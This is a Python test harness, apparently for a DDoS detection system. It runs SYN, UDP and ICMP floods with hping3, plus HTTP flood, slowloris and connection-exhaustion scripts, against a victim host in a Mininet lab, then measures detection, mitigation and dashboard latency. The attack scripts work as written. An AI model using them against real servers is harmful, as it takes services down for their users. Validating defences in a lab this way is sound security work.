"""Live attack harness for Mininet lab validation."""

from __future__ import annotations

import copy
import shlex
import subprocess
import threading
import time
from collections import Counter
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from nsddos.constants import RUNTIME_DIR
from nsddos.dashboard import generate_dashboard_state
from nsddos.providers.mininet.provider import HOST_IPS
from nsddos.runtime.executor import RuntimeExecutor
from nsddos.runtime.persistence import atomic_write_json, read_json_checked
from nsddos.runtime.providers.live.registry import build_live_provider_registry
from nsddos.runtime.providers.live.telemetry import collect_live_telemetry
from nsddos.runtime.streaming import process_stream_events
from nsddos.runtime.streaming.contracts import StreamEvent

ATTACK_DIR = RUNTIME_DIR / "attacks"
ATTACK_ORDER = (
    "syn_flood",
    "udp_flood",
    "icmp_flood",
    "http_flood",
    "slowloris",
    "connection_exhaustion",
)
HTTP_PORTS = {80, 8080, 8081}
EXECUTOR = RuntimeExecutor()


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _runtime_config(config: dict[str, Any]) -> dict[str, Any]:
    runtime = copy.deepcopy(config)
    runtime.setdefault("runtime", {})
    runtime["runtime"].setdefault("live", {})
    runtime["runtime"]["live"]["enabled"] = True
    runtime["runtime"].setdefault("simulation", {})
    runtime["runtime"]["simulation"]["source_enabled"] = False
    runtime["runtime"].setdefault("streaming", {})
    runtime["runtime"]["streaming"]["enabled"] = True
    return runtime


def _persist_report(payload: dict[str, Any]) -> Path:
    ATTACK_DIR.mkdir(parents=True, exist_ok=True)
    run_id = str(payload.get("run_id", "attack")).replace("/", "_")
    stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S%fZ")
    path = ATTACK_DIR / f"attack-{stamp}-{run_id}.json"
    atomic_write_json(path, payload)
    atomic_write_json(ATTACK_DIR / "latest.json", payload)
    return path


def latest_attack_report() -> dict[str, Any]:
    path = ATTACK_DIR / "latest.json"
    if not path.exists():
        return {}
    return read_json_checked(path)


def _host_ip(host: str) -> str:
    return HOST_IPS.get(host, host)


def _run_host_command(args: list[str], timeout: int = 30) -> subprocess.CompletedProcess[str]:
    return subprocess.run(args, capture_output=True, text=True, check=False, timeout=timeout)


def _helper_host_command(host: str, script: str) -> list[str]:
    attach = (
        "pid=$(ps -eo pid,args | awk '/mininet:"
        f"{host}"
        "$/ {print $1; exit}'); "
        "[ -n \"$pid\" ] || { echo missing_mininet_host >&2; exit 1; }; "
        "mnexec -a \"$pid\" sh -lc "
        f"{shlex.quote(script)}"
    )
    return ["sh", "-lc", attach]


def _namespace_shell(host: str, script: str, timeout: int = 30) -> subprocess.CompletedProcess[str]:
    if not EXECUTOR.lab_container_running():
        raise RuntimeError("Labhost container not running.")
    return EXECUTOR.execute_lab(_helper_host_command(host, script), timeout=timeout)


def _background_namespace_task(host: str, script: str) -> threading.Thread:
    def runner() -> None:
        _namespace_shell(host, script, timeout=300)

    thread = threading.Thread(target=runner, daemon=True)
    thread.start()
    return thread


def _stop_attack_processes(attacker: str) -> None:
    _namespace_shell(
        attacker,
        "pkill -f hping3 >/dev/null 2>&1 || true; pkill -f python3 >/dev/null 2>&1 || true",
        timeout=10,
    )


def stop_active_attack(attacker: str, victim: str, target_port: int) -> None:
    """Best-effort stop for LAB-managed active attack processes."""
    _stop_attack_processes(attacker)
    _stop_victim_service(victim, target_port)


def _ensure_hping3() -> None:
    check = _namespace_shell("h1", "command -v hping3", timeout=10)
    if check.returncode == 0:
        return
    install_script = (
        "if command -v apt-get >/dev/null 2>&1; then "
        "apt-get update >/dev/null 2>&1 && apt-get install -y hping3 >/dev/null 2>&1; "
        "elif command -v apk >/dev/null 2>&1; then "
        "apk add --no-cache hping3 >/dev/null 2>&1; "
        "elif command -v dnf >/dev/null 2>&1; then "
        "dnf install -y hping3 >/dev/null 2>&1; "
        "elif command -v yum >/dev/null 2>&1; then "
        "yum install -y hping3 >/dev/null 2>&1; "
        "else exit 1; fi"
    )
    result = _namespace_shell("h1", install_script, timeout=180)
    if result.returncode != 0:
        raise RuntimeError("Unable to install hping3 in Mininet runtime.")


def _start_victim_service(victim: str, target_ip: str, target_port: int) -> threading.Thread:
    _namespace_shell(victim, f"pkill -f 'http.server {target_port}' >/dev/null 2>&1 || true", timeout=10)
    thread = _background_namespace_task(
        victim,
        (
            f"python3 -m http.server {target_port} --bind {shlex.quote(target_ip)} "
            ">/tmp/nsddos-http-victim.log 2>&1"
        ),
    )
    time.sleep(1)
    return thread


def _stop_victim_service(victim: str, target_port: int) -> None:
    _namespace_shell(victim, f"pkill -f 'http.server {target_port}' >/dev/null 2>&1 || true", timeout=10)


def _probe_http(probe: str, target_ip: str, target_port: int) -> dict[str, Any]:
    script = (
        "python3 - <<'PY'\n"
        "import socket, sys\n"
        f"sock = socket.create_connection(({target_ip!r}, {target_port}), 2)\n"
        "sock.sendall(b'GET / HTTP/1.0\\r\\nHost: target\\r\\n\\r\\n')\n"
        "data = sock.recv(64)\n"
        "sock.close()\n"
        "sys.stdout.write(data.decode('latin1', 'ignore'))\n"
        "PY"
    )
    result = _namespace_shell(probe, script, timeout=5)
    return {
        "timestamp": _now(),
        "success": result.returncode == 0 and "HTTP/" in result.stdout,
        "stdout": result.stdout[-200:],
        "stderr": result.stderr[-200:],
    }


def _build_attack_script(attack_type: str, target_ip: str, target_port: int, duration_seconds: int) -> str:
    if attack_type == "syn_flood":
        return (
            f"hping3 -S -p {target_port} --flood {shlex.quote(target_ip)} >/tmp/nsddos-syn.log 2>&1 & "
            "pid=$!; "
            f"sleep {duration_seconds}; "
            "kill $pid >/dev/null 2>&1 || true; wait $pid >/dev/null 2>&1 || true"
        )
    if attack_type == "udp_flood":
        return (
            f"hping3 --udp -p {target_port} --flood {shlex.quote(target_ip)} >/tmp/nsddos-udp.log 2>&1 & "
            "pid=$!; "
            f"sleep {duration_seconds}; "
            "kill $pid >/dev/null 2>&1 || true; wait $pid >/dev/null 2>&1 || true"
        )
    if attack_type == "icmp_flood":
        return (
            f"hping3 --icmp --flood {shlex.quote(target_ip)} >/tmp/nsddos-icmp.log 2>&1 & "
            "pid=$!; "
            f"sleep {duration_seconds}; "
            "kill $pid >/dev/null 2>&1 || true; wait $pid >/dev/null 2>&1 || true"
        )
    if attack_type == "http_flood":
        return (
            "python3 - <<'PY'\n"
            "import socket, threading, time\n"
            f"target=({target_ip!r}, {target_port})\n"
            f"deadline=time.time()+{duration_seconds}\n"
            "def worker():\n"
            "  while time.time() < deadline:\n"
            "    try:\n"
            "      s=socket.create_connection(target,1)\n"
            "      s.sendall(b'GET / HTTP/1.1\\r\\nHost: target\\r\\nConnection: close\\r\\n\\r\\n')\n"
            "      s.recv(64)\n"
            "      s.close()\n"
            "    except OSError:\n"
            "      pass\n"
            "threads=[threading.Thread(target=worker,daemon=True) for _ in range(24)]\n"
            "[t.start() for t in threads]\n"
            "[t.join() for t in threads]\n"
            "PY"
        )
    if attack_type == "slowloris":
        return (
            "python3 - <<'PY'\n"
            "import socket, time\n"
            f"target=({target_ip!r}, {target_port})\n"
            "sockets=[]\n"
            "deadline=time.time()+"
            f"{duration_seconds}\n"
            "for i in range(60):\n"
            "  try:\n"
            "    s=socket.create_connection(target,1)\n"
            "    s.sendall(f'GET /?{i} HTTP/1.1\\r\\nHost: target\\r\\n'.encode())\n"
            "    sockets.append(s)\n"
            "  except OSError:\n"
            "    pass\n"
            "while time.time() < deadline:\n"
            "  alive=[]\n"
            "  for s in sockets:\n"
            "    try:\n"
            "      s.sendall(b'X-a: keep\\r\\n')\n"
            "      alive.append(s)\n"
            "    except OSError:\n"
            "      pass\n"
            "  sockets=alive\n"
            "  time.sleep(1)\n"
            "[s.close() for s in sockets]\n"
            "PY"
        )
    if attack_type == "connection_exhaustion":
        return (
            "python3 - <<'PY'\n"
            "import socket, time\n"
            f"target=({target_ip!r}, {target_port})\n"
            "sockets=[]\n"
            "deadline=time.time()+"
            f"{duration_seconds}\n"
            "for _ in range(200):\n"
            "  try:\n"
            "    s=socket.create_connection(target,1)\n"
            "    sockets.append(s)\n"
            "  except OSError:\n"
            "    pass\n"
            "while time.time() < deadline:\n"
            "  time.sleep(0.5)\n"
            "[s.close() for s in sockets]\n"
            "PY"
        )
    raise ValueError(f"Unsupported attack type: {attack_type}")


def _pick_number(row: dict[str, Any], *keys: str) -> float:
    for key in keys:
        value = row.get(key)
        if isinstance(value, bool):
            return float(int(value))
        if isinstance(value, (int, float)):
            return float(value)
        if isinstance(value, str):
            try:
                return float(value)
            except ValueError:
                continue
    return 0.0


def _pick_protocol(flow: dict[str, Any], target_port: int) -> str:
    protocol = str(flow.get("protocol", flow.get("ipProtocol", ""))).lower()
    port = int(_pick_number(flow, "destination_port", "dst_port", "destinationPort", "port", "dstport"))
    if protocol in {"udp", "icmp"}:
        return protocol
    if protocol in {"http", "https"}:
        return "http"
    if port == target_port and target_port in HTTP_PORTS:
        return "http"
    return "tcp"


def _build_stream_events(
    raw_flows: list[dict[str, Any]],
    snapshot: Any,
    attack_type: str,
    target_ip: str,
    target_port: int,
    attack_started_at: str,
) -> tuple[StreamEvent, ...]:
    timestamp = snapshot.timestamp
    events: list[StreamEvent] = []
    for index, flow in enumerate(raw_flows, start=1):
        protocol = _pick_protocol(flow, target_port)
        packets = _pick_number(flow, "packets", "frames", "packet_count")
        bytes_count = _pick_number(flow, "bytes", "octets", "byte_count")
        connections = _pick_number(flow, "connections", "flows", "connection_count", "new_connections")
        duration = _pick_number(flow, "duration", "flow_duration", "elapsed")
        destination_port = int(_pick_number(flow, "destination_port", "dst_port", "destinationPort", "port", "dstport"))
        if protocol == "http" and duration <= 0 and attack_type == "slowloris":
            duration = max(5.0, time.time() - datetime.fromisoformat(attack_started_at.replace("Z", "+00:00")).timestamp())
        metadata = {
            "destination_port": destination_port,
            "duration_seconds": duration,
            "flags": str(flow.get("tcpFlags", flow.get("flags", ""))),
            "http_rate": packets if protocol == "http" else 0.0,
            "partial_connection_rate": connections if attack_type == "slowloris" and protocol == "http" else 0.0,
        }
        if attack_type == "slowloris" and protocol == "http":
            protocol = "slowloris"
        events.append(
            StreamEvent(
                event_id=f"attack:{attack_type}:{index}:{timestamp.isoformat()}",
                source_type="live",
                packet_rate=max(packets, 1.0),
                byte_rate=max(bytes_count, max(packets, 1.0) * 64.0),
                connection_rate=max(connections, 1.0),
                protocol=protocol,
                source_ip=str(flow.get("source") or flow.get("src_ip") or flow.get("source_ip") or _host_ip("h1")),
                destination_ip=str(flow.get("destination_ip") or target_ip),
                timestamp=timestamp,
                sequence_number=index,
                freshness_state="valid" if snapshot.health_state == "healthy" else "degraded",
                destination_port=destination_port,
                duration_seconds=duration,
                flags=str(flow.get("tcpFlags", flow.get("flags", ""))),
                metadata=metadata,
            )
        )
    if events:
        return tuple(events)
    fallback_protocol = {
        "syn_flood": "tcp",
        "udp_flood": "udp",
        "icmp_flood": "icmp",
        "http_flood": "http",
        "slowloris": "slowloris",
        "connection_exhaustion": "tcp",
    }.get(attack_type, "tcp")
    return (
        StreamEvent(
            event_id=f"attack:{attack_type}:fallback:{timestamp.isoformat()}",
            source_type="live",
            packet_rate=max(snapshot.packet_rate, 1.0),
            byte_rate=max(snapshot.byte_rate, 64.0),
            connection_rate=max(snapshot.connection_rate, 1.0),
            protocol=fallback_protocol,
            source_ip=_host_ip("h1"),
            destination_ip=target_ip,
            timestamp=timestamp,
            sequence_number=1,
            freshness_state="valid" if snapshot.health_state == "healthy" else "degraded",
            destination_port=target_port,
            duration_seconds=max(1.0, time.time() - datetime.fromisoformat(attack_started_at.replace("Z", "+00:00")).timestamp()),
            flags="S" if attack_type == "syn_flood" else "",
            metadata={
                "destination_port": target_port,
                "duration_seconds": 15.0 if attack_type == "slowloris" else 1.0,
                "http_rate": max(snapshot.packet_rate, 1.0) if attack_type in {"http_flood", "slowloris"} else 0.0,
                "partial_connection_rate": max(snapshot.connection_rate, 1.0) if attack_type == "slowloris" else 0.0,
            },
        ),
    )


def _collect_live_inputs(config: dict[str, Any], attack_type: str, target_ip: str, target_port: int, attack_started_at: str) -> tuple[Any, list[dict[str, Any]], tuple[StreamEvent, ...]]:
    registry = build_live_provider_registry(config)
    snapshot = collect_live_telemetry(config)
    flows_result = registry.pool.get_json(f"{registry.sflowrt.api_url}/flows/json?maxFlows=20&timeout=1")
    raw_flows = flows_result.payload if isinstance(flows_result.payload, list) else []
    events = _build_stream_events(raw_flows, snapshot, attack_type, target_ip, target_port, attack_started_at)
    return snapshot, raw_flows, events


def _record_false_positives(bucket: dict[str, int], evaluation: Any) -> None:
    detection = evaluation.detection_payload
    ml = evaluation.ml_payload
    policy = evaluation.policy_payload
    mitigation = evaluation.mitigation_payload
    if detection.get("attack_detected"):
        bucket["detection"] += 1
    if ml.get("predicted_attack_type") not in {"", "normal"} and float(ml.get("attack_probability", 0.0)) >= 0.5:
        bucket["ml"] += 1
    if policy.get("recommended_action") not in {"", "alert_only"}:
        bucket["policy"] += 1
    if mitigation.get("mitigation_status") in {"enforced", "verified"}:
        bucket["mitigation"] += 1


def _probe_drop_rate(samples: list[dict[str, Any]]) -> float:
    if not samples:
        return 0.0
    failed = len([item for item in samples if not item.get("success", False)])
    return failed / len(samples)


def _count_by_protocol(flows: list[dict[str, Any]], target_port: int) -> Counter[str]:
    counts: Counter[str] = Counter()
    for flow in flows:
        counts[_pick_protocol(flow, target_port)] += 1
    return counts


def _attack_seen(raw_flows: list[dict[str, Any]], attack_type: str, attacker_ip: str, target_ip: str, target_port: int) -> bool:
    for flow in raw_flows:
        source = str(flow.get("source") or flow.get("src_ip") or flow.get("source_ip") or "")
        destination = str(flow.get("destination_ip") or target_ip)
        port = int(_pick_number(flow, "destination_port", "dst_port", "destinationPort", "port", "dstport"))
        if source != attacker_ip or destination != target_ip:
            continue
        if attack_type == "icmp_flood":
            return True
        if attack_type in {"http_flood", "slowloris", "syn_flood", "udp_flood", "connection_exhaustion"} and port == target_port:
            return True
    return False


def _summarize_scenario(
    attack_type: str,
    attack_started_at: str,
    first_sflow_seen_at: str | None,
    first_dashboard_visible_at: str | None,
    evaluation: Any | None,
    probes: list[dict[str, Any]],
    dropped_before: int,
    dropped_after: int,
    false_positives: dict[str, dict[str, int]],
) -> dict[str, Any]:
    detection_payload = evaluation.detection_payload if evaluation else {}
    ml_payload = evaluation.ml_payload if evaluation else {}
    policy_payload = evaluation.policy_payload if evaluation else {}
    mitigation_payload = evaluation.mitigation_payload if evaluation else {}
    metrics = {
        "detection_latency_seconds": _latency_seconds(attack_started_at, first_sflow_seen_at if not detection_payload else detection_payload.get("telemetry_timestamp")),
        "mitigation_latency_seconds": _latency_seconds(attack_started_at, mitigation_payload.get("timestamp") or mitigation_payload.get("created_at")),
        "dashboard_latency_seconds": _latency_seconds(attack_started_at, first_dashboard_visible_at),
        "probe_drop_rate": _probe_drop_rate(probes),
        "live_drop_delta": max(0, dropped_after - dropped_before),
        "false_positives": {
            "warmup": false_positives["warmup"],
            "cooldown": false_positives["cooldown"],
            "aggregate_rate": (
                sum(false_positives["warmup"].values()) + sum(false_positives["cooldown"].values())
            ) / max(len(probes), 1),
        },
    }
    return {
        "attack_type": attack_type,
        "metrics": metrics,
        "subsystems": {
            "telemetry_reached_sflowrt": bool(first_sflow_seen_at),
            "detection_triggered": bool(detection_payload.get("attack_detected")),
            "ml_classified": ml_payload.get("predicted_attack_type") == attack_type or bool(ml_payload.get("attack_probability", 0.0) >= 0.5),
            "policy_reacted": policy_payload.get("recommended_action") not in {"", "alert_only"},
            "mitigation_executed": mitigation_payload.get("mitigation_status") in {"enforced", "verified"},
            "dashboard_showed_attack": bool(first_dashboard_visible_at),
        },
        "final_detection": detection_payload,
        "final_ml": ml_payload,
        "final_policy": policy_payload,
        "final_mitigation": mitigation_payload,
        "probe_samples": probes,
    }


def _latency_seconds(start: str | None, end: str | None) -> float | None:
    if not start or not end:
        return None
    start_dt = datetime.fromisoformat(str(start).replace("Z", "+00:00"))
    end_dt = datetime.fromisoformat(str(end).replace("Z", "+00:00"))
    return max(0.0, (end_dt - start_dt).total_seconds())


def _run_attack(
    config: dict[str, Any],
    attack_type: str,
    attacker: str,
    victim: str,
    probe: str,
    target_ip: str,
    target_port: int,
    warmup: int,
    attack_seconds: int,
    cooldown: int,
    stop_event: threading.Event | None = None,
) -> dict[str, Any]:
    attacker_ip = _host_ip(attacker)
    victim_thread: threading.Thread | None = None
    victim_thread = _start_victim_service(victim, target_ip, target_port)
    first_sflow_seen_at = None
    first_dashboard_visible_at = None
    dropped_before = 0
    dropped_after = 0
    warmup_false_positives = {"detection": 0, "ml": 0, "policy": 0, "mitigation": 0}
    cooldown_false_positives = {"detection": 0, "ml": 0, "policy": 0, "mitigation": 0}
    probe_samples: list[dict[str, Any]] = []
    latest_evaluation = None
    try:
        warmup_started_at = _now()
        for _ in range(max(warmup, 1)):
            if stop_event is not None and stop_event.is_set():
                break
            snapshot, raw_flows, events = _collect_live_inputs(config, attack_type, target_ip, target_port, warmup_started_at)
            dropped_before = int(snapshot.dropped_packets)
            latest_evaluation = process_stream_events(config, session_id=f"attack-{attack_type}-warmup", events=events)
            _record_false_positives(warmup_false_positives, latest_evaluation)
            probe_samples.append(_probe_http(probe, target_ip, target_port))
            time.sleep(1)
        attack_started_at = _now()
        attack_script = _build_attack_script(attack_type, target_ip, target_port, attack_seconds)
        if attack_type in {"syn_flood", "udp_flood", "icmp_flood"}:
            _ensure_hping3()
        attack_thread = _background_namespace_task(attacker, attack_script)
        deadline = time.time() + attack_seconds
        while time.time() < deadline:
            if stop_event is not None and stop_event.is_set():
                stop_active_attack(attacker, victim, target_port)
                break
            snapshot, raw_flows, events = _collect_live_inputs(config, attack_type, target_ip, target_port, attack_started_at)
            if first_sflow_seen_at is None and (_attack_seen(raw_flows, attack_type, attacker_ip, target_ip, target_port) or snapshot.active_flows > 0):
                first_sflow_seen_at = _now()
            latest_evaluation = process_stream_events(config, session_id=f"attack-{attack_type}-live", events=events)
            dashboard = generate_dashboard_state(config)
            if first_dashboard_visible_at is None and dashboard.active_attacks > 0:
                first_dashboard_visible_at = _now()
            probe_samples.append(_probe_http(probe, target_ip, target_port))
            time.sleep(1)
        attack_thread.join(timeout=5)
        attack_stopped_at = _now()
        for _ in range(max(cooldown, 1)):
            if stop_event is not None and stop_event.is_set():
                break
            snapshot, raw_flows, events = _collect_live_inputs(config, attack_type, target_ip, target_port, attack_started_at)
            dropped_after = int(snapshot.dropped_packets)
            latest_evaluation = process_stream_events(config, session_id=f"attack-{attack_type}-cooldown", events=events)
            _record_false_positives(cooldown_false_positives, latest_evaluation)
            probe_samples.append(_probe_http(probe, target_ip, target_port))
            time.sleep(1)
        protocol_mix = _count_by_protocol(raw_flows if 'raw_flows' in locals() else [], target_port)
        summary = _summarize_scenario(
            attack_type,
            attack_started_at,
            first_sflow_seen_at,
            first_dashboard_visible_at,
            latest_evaluation,
            probe_samples,
            dropped_before,
            dropped_after,
            {"warmup": warmup_false_positives, "cooldown": cooldown_false_positives},
        )
        return {
            "attack_type": attack_type,
            "warmup_started_at": warmup_started_at,
            "attack_started_at": attack_started_at,
            "first_sflow_seen_at": first_sflow_seen_at,
            "first_detection_at": latest_evaluation.detection_payload.get("telemetry_timestamp") if latest_evaluation else None,
            "first_ml_classification_at": latest_evaluation.ml_payload.get("timestamp") if latest_evaluation else None,
            "first_policy_action_at": latest_evaluation.policy_payload.get("timestamp") if latest_evaluation else None,
            "first_mitigation_enforced_at": latest_evaluation.mitigation_payload.get("timestamp") if latest_evaluation else None,
            "dashboard_visible_at": first_dashboard_visible_at,
            "attack_stopped_at": attack_stopped_at,
            "protocol_mix": dict(protocol_mix),
            "summary": summary,
            "root_cause": "" if all(summary["subsystems"].values()) else "subsystem_transition_missing",
            "fix_applied": "",
        }
    finally:
        _stop_victim_service(victim, target_port)
        if victim_thread is not None:
            victim_thread.join(timeout=1)


def run_live_attack_suite(
    config: dict[str, Any],
    attack: str = "all",
    *,
    attacker: str = "h1",
    victim: str = "h2",
    probe: str = "h3",
    target_ip: str = "10.0.0.2",
    target_port: int = 8081,
    warmup: int = 10,
    attack_seconds: int = 15,
    cooldown: int = 15,
    stop_event: threading.Event | None = None,
) -> dict[str, Any]:
    runtime_config = _runtime_config(config)
    selected = ATTACK_ORDER if attack == "all" else (attack,)
    results = []
    for attack_type in selected:
        if attack_type not in ATTACK_ORDER:
            raise ValueError(f"Unsupported attack type: {attack_type}")
        results.append(
            _run_attack(
                runtime_config,
                attack_type,
                attacker,
                victim,
                probe,
                target_ip,
                target_port,
                warmup,
                attack_seconds,
                cooldown,
                stop_event,
            )
        )
    suite = {
        "run_id": f"live-suite-{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%S%fZ')}",
        "environment": {
            "attacker": attacker,
            "victim": victim,
            "probe": probe,
            "target_ip": target_ip,
            "target_port": target_port,
            "live_mode": runtime_config["runtime"]["live"]["enabled"],
            "simulation_source_enabled": runtime_config["runtime"]["simulation"]["source_enabled"],
            "streaming_enabled": runtime_config["runtime"]["streaming"]["enabled"],
        },
        "scenarios": results,
    }
    path = _persist_report(suite)
    suite["report_path"] = str(path)
    return suite
